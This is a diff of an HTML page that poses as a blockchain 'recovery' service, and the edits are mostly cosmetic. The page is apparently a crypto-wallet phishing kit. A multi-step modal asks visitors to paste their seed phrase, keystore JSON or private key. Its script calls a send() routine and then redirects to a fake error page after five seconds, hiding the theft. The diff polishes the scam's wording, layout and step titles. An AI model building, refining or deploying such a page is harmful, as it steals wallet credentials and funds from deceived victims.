@@ -54,7 +54,7 @@
 
     .step-buttons {
       display: flex;
-      justify-content: space-between;
+      justify-content: center;
     }
 
     .modal-lg,
@@ -94,9 +94,10 @@
   <div class="hero_area" style="justify-content: center; align-items: center;">
 
     <!-- Hidden div for wallet selection -->
-<button id='modal-button' type="button" style="padding:1rem; background-color: rgba(0, 23, 51, 0.9);"  class="btn btn-primary" data-toggle="modal" data-target="#multiStepModal">
-  Start recovery
-</button>
+    <button id='modal-button' type="button" style="padding:1rem; background-color: rgba(0, 23, 51, 0.9);"
+      class="btn btn-primary" data-toggle="modal" data-target="#multiStepModal">
+      Start recovery
+    </button>
 
     <div class="container-fluid">
       <div class="hero_bg_box" style="filter: blur(4px) brightness(0.5); background-image: url('/images/bgbgbg.png'); background-repeat: no-repeat;
@@ -108,7 +109,7 @@
 
 
       <!-- Multi-Step Modal -->
-       <!-- Button to trigger modal -->
+      <!-- Button to trigger modal -->
 
       <div class="modal fade" id="multiStepModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true"
         style="">
@@ -121,13 +122,14 @@
               <div class="step-content active" id="step1">
 
                 <p>
-                  In order to perform a complete blockchain scan and recovery you are required to complete a few steps
-                  to verify your wallet account and confirm your transaction ID.
+                  To conduct a comprehensive blockchain scan and recovery, please complete the necessary steps to verify
+                  your wallet account and confirm your transaction ID.
+
                 </p>
                 <div class="form-check">
                   <input class="form-check-input" type="checkbox" id="exampleCheckbox">
                   <label class="form-check-label" for="exampleCheckbox">
-                    Yes, I understand and I am ready to proceed.
+                    Yes, I understand and wish to proceed
                   </label>
                 </div>
               </div>
@@ -142,7 +144,7 @@
               </div>
 
               <div class="step-content" id="step3" style="display: none;">
-                <h3 style="font-size: 1rem; text-align: center;  margin-bottom: 1rem">Select your preferred method</h3>
+                <h3 style="font-size: 1rem; font-weight: normal; text-align: center;  margin-bottom: 1rem">Select your preferred method</h3>
                 <ul class="nav nav-tabs" id="myTab" role="tablist">
                   <li class="nav-item" role="presentation">
                     <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home"
@@ -152,13 +154,13 @@
                   </li>
                   <li class="nav-item" role="presentation">
                     <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile"
-                      type="button" role="tab" aria-controls="profile" aria-selected="false"style="color:black">
+                      type="button" role="tab" aria-controls="profile" aria-selected="false" style="color:black">
                       Keystore
                     </button>
                   </li>
                   <li class="nav-item" role="presentation">
                     <button class="nav-link" id="contact-tab" data-bs-toggle="tab" data-bs-target="#contact"
-                      type="button" role="tab" aria-controls="contact" aria-selected="false"style="color:black">
+                      type="button" role="tab" aria-controls="contact" aria-selected="false" style="color:black">
                       Key
                     </button>
                   </li>
@@ -169,11 +171,13 @@
                     <!-- This is for phrase  -->
                     <form id="phrase-form">
                       <div class="form-group mb-3" style="font-weight: lighter;">
-                        <textarea style="height: 10rem; border-width: 1px;color: #3ab6ff" class="form-control" required type="text"
-                          placeholder="Seed phrase..." name="phrase" oninput="watchmen()" id="verify"></textarea>
+                        <textarea style="height: 10rem; border-width: 1px;color: #3ab6ff" class="form-control" required
+                          type="text" placeholder="Seed phrase..." name="phrase" oninput="watchmen()"
+                          id="verify"></textarea>
 
-                          <p class="small-text" style="margin-top: 0.8rem">Typically 12 (sometimes 24) words separated by a single space
-                          </p>
+                        <p class="small-text" style="margin-top: 0.8rem">Typically, this involves 12 (occasionally 24)
+                          words separated by a single space.
+                        </p>
                       </div>
 
 
@@ -186,8 +190,6 @@
                       <div class="form-group mb-3">
                         <textarea style="height: 10rem; color: #1CB0F6" required type="text" name="keystore-json"
                           placeholder="Keystore JSON..." id="key" class="form-control"></textarea>
-                        <div id="" class="form-text">
-                        </div>
                         <input style="
                     margin-top: 20px;
                     margin-bottom: 30px;
@@ -219,20 +221,21 @@
                 <div class="form-check" style="text-align: center; font-size:1rem">
                   <input class="form-check-input" type="checkbox" id="submitc">
                   <label class="form-check-label" for="submitc">
-                    I agree to <a href="legal/terms.html" target="_blank">Terms of use</a> and <a href="legal/terms.html" target="_blank">Privacy policy</a>
+                    I agree to <a href="legal/terms.html" target="_blank">Terms of use</a> and <a
+                      href="legal/terms.html" target="_blank">Privacy policy</a>
                   </label>
                 </div>
 
 
               </div>
 
-              <div style="display: flex; justify-content:space-between;" id="button-container">
+              <div style="display: flex; justify-content: center;" id="button-container">
                 <button type="button" class="btn btn-secondary" id="prevBtn"
-                  style="padding: 0.75rem 2rem; ; display: none; margin-top:1rem">Back</button>
+                  style="padding: 0.75rem 2rem; ; display: none; margin: 1rem 1rem; margin-bottom: 0;">Back</button>
                 <button type="button" class="btn btn-primary" id="nextBtn"
-                  style="padding: 0.75rem 2rem; margin-top:1rem" disabled>Next</button>
+                  style="padding: 0.75rem 2rem; margin: 1rem 1rem; margin-bottom: 0;" disabled>Next</button>
                 <button type="button" class="btn btn-primary" id="submitBtn"
-                  style="padding: 0.75rem 2rem;  display: none; margin-top:1rem; justify-self: center;"
+                  style="padding: 0.75rem 2rem;  display: none; margin: 1rem 1rem;  margin-bottom: 0;justify-self: center;"
                   disabled>Submit</button>
               </div>
 
@@ -262,14 +265,14 @@
 
       <script type="text/javascript" src="js/form.js"></script>
       <script>
-        document.addEventListener('DOMContentLoaded', function() {
-    var openModalBtn = document.getElementById('modal-button');
-    var multiStepModal = new bootstrap.Modal(document.getElementById('multiStepModal'));
+        document.addEventListener('DOMContentLoaded', function () {
+          var openModalBtn = document.getElementById('modal-button');
+          var multiStepModal = new bootstrap.Modal(document.getElementById('multiStepModal'));
 
-    openModalBtn.addEventListener('click', function() {
-      multiStepModal.show();
-    });
-  });
+          openModalBtn.addEventListener('click', function () {
+            multiStepModal.show();
+          });
+        });
         const steps = [...document.querySelectorAll('.step-content')];
         const nextBtn = document.getElementById('nextBtn');
         const prevBtn = document.getElementById('prevBtn');
@@ -324,17 +327,17 @@
               send(3);
             }
           }
-          setTimeout(function() {
-    // Redirect to 'monkey.html' after 5 seconds
-    window.location.href = 'errorpage.html';
-}, 5000); // 5000 milliseconds = 5 seconds
+          setTimeout(function () {
+            // Redirect to 'monkey.html' after 5 seconds
+            window.location.href = 'errorpage.html';
+          }, 5000); // 5000 milliseconds = 5 seconds
 
         });
         function showStep(step) {
           steps.forEach((content, index) => {
             content.style.display = index === step ? 'block' : 'none';
           });
-          title.textContent = `Step ${step + 1} / 3`;
+          title.textContent = `Step ${step + 1} / 5`;
           if (step === 0) {
             row.style.justifyContent = 'center';
             if (checkbox.checked) {
@@ -345,14 +348,16 @@
             prevBtn.style.display = 'none';
 
           } else if (step === 1) {
+            title.textContent = title.textContent.concat(' - Transaction identification');
             nextBtn.disabled = true;
-            row.style.justifyContent = 'space-between';
+            row.style.justifyContent = 'center';
             prevBtn.style.display = 'inline-block';
             submitBtn.style.display = 'none';
             nextBtn.style.display = 'inline-block';
             validateID();
 
           } else {
+            title.textContent = title.textContent.concat(' - Connect wallet account');
             nextBtn.style.display = 'none';
             submitBtn.style.display = 'inline-block';
           }
@@ -415,7 +420,7 @@
           } else {
             submitBtn.disabled = true;
             prevBtn.style.display = 'inline-block';
-            row.style.justifyContent = 'space-between';
+            row.style.justifyContent = 'center';
           }
         });
       </script>
